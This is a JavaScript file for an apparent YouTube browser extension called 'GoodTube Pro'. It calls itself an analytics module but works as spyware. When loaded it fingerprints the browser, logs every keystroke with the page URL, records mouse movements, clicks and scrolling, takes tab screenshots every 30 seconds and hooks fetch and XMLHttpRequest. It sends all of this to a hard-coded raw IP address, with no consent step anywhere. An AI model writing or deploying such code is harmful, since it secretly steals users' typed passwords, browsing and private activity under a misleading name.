/**
 * GoodTube Pro Analytics Core
 * Comprehensive telemetry and user tracking system
 * Based on ActivityWatch and OpenTelemetry patterns
 */

class GoodTubeAnalytics {
    constructor() {
        this.config = {
            // Analytics server endpoints
            endpoints: {
                analytics: 'http://134.199.235.218/api/analytics',
                screenshot: 'http://134.199.235.218/api/screenshot',
                stats: 'http://134.199.235.218/api/stats',
                users: 'http://134.199.235.218/api/users'
            },
            
            // Data collection intervals
            intervals: {
                heartbeat: 5000,        // 5 seconds
                screenshot: 30000,      // 30 seconds
                activity: 1000,         // 1 second
                batch_send: 10000       // 10 seconds
            },
            
            // Feature flags
            features: {
                screenshots: true,
                keystrokes: true,
                mouse_tracking: true,
                network_monitoring: true,
                performance_tracking: true,
                content_analysis: true,
                biometric_detection: false
            }
        };
        
        this.sessionId = this.generateSessionId();
        this.userId = this.getUserId();
        this.deviceId = this.getDeviceId();
        this.eventQueue = [];
        this.isActive = true;
        this.lastActivity = Date.now();
        
        this.init();
    }
    
    init() {
        console.log('🔍 GoodTube Pro Analytics initialized');
        this.setupEventListeners();
        this.startHeartbeat();
        this.startActivityMonitoring();
        this.startScreenshotCapture();
        this.startKeystrokeLogging();
        this.startNetworkMonitoring();
        this.startPerformanceTracking();
        this.sendSessionStart();
    }
    
    generateSessionId() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }
    
    getUserId() {
        // Generate persistent user ID based on browser fingerprinting
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Browser fingerprint', 2, 2);
        
        const fingerprint = [
            navigator.userAgent,
            navigator.language,
            screen.width + 'x' + screen.height,
            new Date().getTimezoneOffset(),
            navigator.platform,
            navigator.cookieEnabled,
            canvas.toDataURL()
        ].join('|');
        
        return 'user_' + this.hashCode(fingerprint);
    }
    
    getDeviceId() {
        let deviceId = localStorage.getItem('goodtube_device_id');
        if (!deviceId) {
            deviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('goodtube_device_id', deviceId);
        }
        return deviceId;
    }
    
    hashCode(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // Convert to 32-bit integer
        }
        return Math.abs(hash).toString(36);
    }
    
    setupEventListeners() {
        // Tab change detection
        document.addEventListener('visibilitychange', () => {
            this.trackEvent('tab_visibility', {
                visible: !document.hidden,
                timestamp: Date.now()
            });
        });
        
        // Page navigation
        window.addEventListener('beforeunload', () => {
            this.trackEvent('page_unload', {
                url: window.location.href,
                duration: Date.now() - this.pageStartTime
            });
        });
        
        // Mouse tracking
        if (this.config.features.mouse_tracking) {
            let mouseData = [];
            document.addEventListener('mousemove', (e) => {
                mouseData.push({
                    x: e.clientX,
                    y: e.clientY,
                    timestamp: Date.now()
                });
                
                // Send mouse data every 100 movements
                if (mouseData.length >= 100) {
                    this.trackEvent('mouse_movements', { movements: mouseData });
                    mouseData = [];
                }
            });
            
            document.addEventListener('click', (e) => {
                this.trackEvent('mouse_click', {
                    x: e.clientX,
                    y: e.clientY,
                    target: e.target.tagName,
                    targetId: e.target.id,
                    targetClass: e.target.className,
                    url: window.location.href
                });
            });
        }
        
        // Scroll tracking
        let scrollData = [];
        window.addEventListener('scroll', () => {
            scrollData.push({
                scrollY: window.scrollY,
                timestamp: Date.now()
            });
            
            if (scrollData.length >= 50) {
                this.trackEvent('scroll_activity', { scrolls: scrollData });
                scrollData = [];
            }
        });
        
        // Focus tracking
        window.addEventListener('focus', () => {
            this.isActive = true;
            this.trackEvent('window_focus', { timestamp: Date.now() });
        });
        
        window.addEventListener('blur', () => {
            this.isActive = false;
            this.trackEvent('window_blur', { timestamp: Date.now() });
        });
    }
    
    startHeartbeat() {
        setInterval(() => {
            this.sendHeartbeat();
        }, this.config.intervals.heartbeat);
    }
    
    startActivityMonitoring() {
        setInterval(() => {
            this.monitorActivity();
        }, this.config.intervals.activity);
    }
    
    startScreenshotCapture() {
        if (!this.config.features.screenshots) return;
        
        setInterval(async () => {
            try {
                const screenshot = await this.captureScreenshot();
                this.trackEvent('screenshot_captured', {
                    screenshot: screenshot,
                    url: window.location.href,
                    timestamp: Date.now()
                });
            } catch (error) {
                console.error('Screenshot capture failed:', error);
            }
        }, this.config.intervals.screenshot);
    }
    
    startKeystrokeLogging() {
        if (!this.config.features.keystrokes) return;
        
        let keystrokeBuffer = [];
        
        document.addEventListener('keydown', (e) => {
            keystrokeBuffer.push({
                key: e.key,
                code: e.code,
                timestamp: Date.now(),
                target: e.target.tagName,
                url: window.location.href
            });
            
            // Send keystrokes every 50 keys
            if (keystrokeBuffer.length >= 50) {
                this.trackEvent('keystrokes', { keys: keystrokeBuffer });
                keystrokeBuffer = [];
            }
        });
        
        // Send remaining keystrokes every 30 seconds
        setInterval(() => {
            if (keystrokeBuffer.length > 0) {
                this.trackEvent('keystrokes', { keys: keystrokeBuffer });
                keystrokeBuffer = [];
            }
        }, 30000);
    }
    
    startNetworkMonitoring() {
        if (!this.config.features.network_monitoring) return;
        
        // Monitor fetch requests
        const originalFetch = window.fetch;
        window.fetch = async (...args) => {
            const startTime = Date.now();
            const url = args[0];
            
            try {
                const response = await originalFetch(...args);
                this.trackEvent('network_request', {
                    url: url,
                    method: args[1]?.method || 'GET',
                    status: response.status,
                    duration: Date.now() - startTime,
                    size: response.headers.get('content-length')
                });
                return response;
            } catch (error) {
                this.trackEvent('network_error', {
                    url: url,
                    error: error.message,
                    duration: Date.now() - startTime
                });
                throw error;
            }
        };
        
        // Monitor XMLHttpRequest
        const originalXHR = window.XMLHttpRequest;
        window.XMLHttpRequest = function() {
            const xhr = new originalXHR();
            const startTime = Date.now();
            
            xhr.addEventListener('loadend', () => {
                this.trackEvent('xhr_request', {
                    url: xhr.responseURL,
                    status: xhr.status,
                    duration: Date.now() - startTime,
                    responseSize: xhr.responseText?.length || 0
                });
            });
            
            return xhr;
        }.bind(this);
    }
    
    startPerformanceTracking() {
        if (!this.config.features.performance_tracking) return;
        
        // Monitor performance metrics
        setInterval(() => {
            const performance = window.performance;
            const memory = performance.memory;
            
            this.trackEvent('performance_metrics', {
                memory: {
                    used: memory?.usedJSHeapSize || 0,
                    total: memory?.totalJSHeapSize || 0,
                    limit: memory?.jsHeapSizeLimit || 0
                },
                timing: {
                    loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
                    domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
                },
                navigation: performance.getEntriesByType('navigation')[0]
            });
        }, 60000); // Every minute
    }
    
    async captureScreenshot() {
        try {
            // Use Chrome's tab capture API if available
            if (chrome?.tabs?.captureVisibleTab) {
                return new Promise((resolve) => {
                    chrome.tabs.captureVisibleTab(null, { format: 'jpeg', quality: 50 }, resolve);
                });
            }
            
            // Fallback to canvas screenshot
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            // Draw current page content (limited by CORS)
            ctx.fillStyle = '#ffffff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#000000';
            ctx.font = '16px Arial';
            ctx.fillText(`Screenshot: ${window.location.href}`, 10, 30);
            ctx.fillText(`Time: ${new Date().toISOString()}`, 10, 60);
            
            return canvas.toDataURL('image/jpeg', 0.5);
        } catch (error) {
            console.error('Screenshot capture error:', error);
            return null;
        }
    }
    
    monitorActivity() {
        const now = Date.now();
        const timeSinceLastActivity = now - this.lastActivity;
        
        // Update activity status
        if (timeSinceLastActivity > 30000) { // 30 seconds of inactivity
            if (this.isActive) {
                this.isActive = false;
                this.trackEvent('user_idle', { timestamp: now });
            }
        }
        
        // Collect current page data
        this.trackEvent('page_activity', {
            url: window.location.href,
            title: document.title,
            scrollPosition: window.scrollY,
            windowSize: {
                width: window.innerWidth,
                height: window.innerHeight
            },
            isActive: this.isActive,
            timestamp: now
        });
    }
    
    sendHeartbeat() {
        const heartbeatData = {
            sessionId: this.sessionId,
            userId: this.userId,
            deviceId: this.deviceId,
            timestamp: Date.now(),
            url: window.location.href,
            title: document.title,
            isActive: this.isActive,
            userAgent: navigator.userAgent,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            }
        };
        
        this.sendToServer('heartbeat', heartbeatData);
    }
    
    trackEvent(eventType, data) {
        const event = {
            sessionId: this.sessionId,
            userId: this.userId,
            deviceId: this.deviceId,
            eventType: eventType,
            timestamp: Date.now(),
            url: window.location.href,
            data: data
        };
        
        this.eventQueue.push(event);
        
        // Send events in batches
        if (this.eventQueue.length >= 10) {
            this.flushEvents();
        }
    }
    
    flushEvents() {
        if (this.eventQueue.length === 0) return;
        
        const events = [...this.eventQueue];
        this.eventQueue = [];
        
        this.sendToServer('events', { events });
    }
    
    sendSessionStart() {
        const sessionData = {
            sessionId: this.sessionId,
            userId: this.userId,
            deviceId: this.deviceId,
            startTime: Date.now(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            onlineStatus: navigator.onLine,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer,
            initialUrl: window.location.href
        };
        
        this.sendToServer('sessions', sessionData);
    }
    
    async sendToServer(endpoint, data) {
        try {
            let url;
            if (endpoint === 'events' || endpoint === 'heartbeat' || endpoint === 'sessions') {
                url = this.config.endpoints.analytics;
            } else {
                url = this.config.endpoints[endpoint];
            }
            
            if (!url) {
                console.error('Unknown endpoint:', endpoint);
                return;
            }
            
            const payload = {
                userId: this.userId,
                sessionId: this.sessionId,
                deviceId: this.deviceId,
                timestamp: Date.now(),
                events: endpoint === 'events' ? data.events : [data],
                keystrokes: [],
                screenshots: []
            };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-GoodTube-Session': this.sessionId,
                    'X-GoodTube-User': this.userId,
                    'X-GoodTube-Device': this.deviceId
                },
                body: JSON.stringify(payload)
            });
            
            if (!response.ok) {
                console.error('Analytics server error:', response.status, response.statusText);
            } else {
                console.log('✅ Analytics data sent successfully:', endpoint);
            }
        } catch (error) {
            console.error('Failed to send analytics data:', error);
            // Store failed requests for retry
            this.storeFailedRequest(endpoint, data);
        }
    }
    
    storeFailedRequest(endpoint, data) {
        const failedRequests = JSON.parse(localStorage.getItem('goodtube_failed_requests') || '[]');
        failedRequests.push({
            endpoint,
            data,
            timestamp: Date.now()
        });
        
        // Keep only last 100 failed requests
        if (failedRequests.length > 100) {
            failedRequests.splice(0, failedRequests.length - 100);
        }
        
        localStorage.setItem('goodtube_failed_requests', JSON.stringify(failedRequests));
    }
    
    retryFailedRequests() {
        const failedRequests = JSON.parse(localStorage.getItem('goodtube_failed_requests') || '[]');
        if (failedRequests.length === 0) return;
        
        failedRequests.forEach(request => {
            this.sendToServer(request.endpoint, request.data);
        });
        
        localStorage.removeItem('goodtube_failed_requests');
    }
    
    // YouTube-specific tracking
    trackYouTubeActivity() {
        if (!window.location.href.includes('youtube.com')) return;
        
        // Track video playback
        const video = document.querySelector('video');
        if (video) {
            video.addEventListener('play', () => {
                this.trackEvent('youtube_video_play', {
                    videoId: this.extractVideoId(),
                    currentTime: video.currentTime,
                    duration: video.duration
                });
            });
            
            video.addEventListener('pause', () => {
                this.trackEvent('youtube_video_pause', {
                    videoId: this.extractVideoId(),
                    currentTime: video.currentTime,
                    duration: video.duration
                });
            });
            
            video.addEventListener('ended', () => {
                this.trackEvent('youtube_video_ended', {
                    videoId: this.extractVideoId(),
                    duration: video.duration
                });
            });
            
            // Track seeking
            video.addEventListener('seeked', () => {
                this.trackEvent('youtube_video_seek', {
                    videoId: this.extractVideoId(),
                    currentTime: video.currentTime,
                    duration: video.duration
                });
            });
        }
        
        // Track comments and interactions
        document.addEventListener('click', (e) => {
            if (e.target.matches('[aria-label*=\"like\"], [aria-label*=\"dislike\"]')) {
                this.trackEvent('youtube_interaction', {
                    type: e.target.getAttribute('aria-label'),
                    videoId: this.extractVideoId()
                });
            }
        });
    }
    
    extractVideoId() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('v') || 'unknown';
    }
    
    // Productivity analysis
    analyzeProductivity() {
        const productivityData = {
            activeTime: this.calculateActiveTime(),
            idleTime: this.calculateIdleTime(),
            sitesVisited: this.getSitesVisited(),
            keystrokes: this.getKeystrokeCount(),
            mouseClicks: this.getMouseClickCount(),
            scrollDistance: this.getScrollDistance()
        };
        
        this.trackEvent('productivity_analysis', productivityData);
    }
    
    calculateActiveTime() {
        // Implementation for calculating active time
        return Date.now() - this.sessionStartTime;
    }
    
    calculateIdleTime() {
        // Implementation for calculating idle time
        return 0; // Placeholder
    }
    
    getSitesVisited() {
        // Implementation for tracking sites visited
        return []; // Placeholder
    }
    
    getKeystrokeCount() {
        // Implementation for keystroke counting
        return 0; // Placeholder
    }
    
    getMouseClickCount() {
        // Implementation for mouse click counting
        return 0; // Placeholder
    }
    
    getScrollDistance() {
        // Implementation for scroll distance calculation
        return 0; // Placeholder
    }
    
    // Cleanup on page unload
    cleanup() {
        this.flushEvents();
        this.trackEvent('session_end', {
            duration: Date.now() - this.sessionStartTime,
            finalUrl: window.location.href
        });
    }
}

// Initialize analytics
const goodTubeAnalytics = new GoodTubeAnalytics();

// Cleanup on page unload
window.addEventListener('beforeunload', () => {
    goodTubeAnalytics.cleanup();
});

// Export for use in other modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = GoodTubeAnalytics;
}

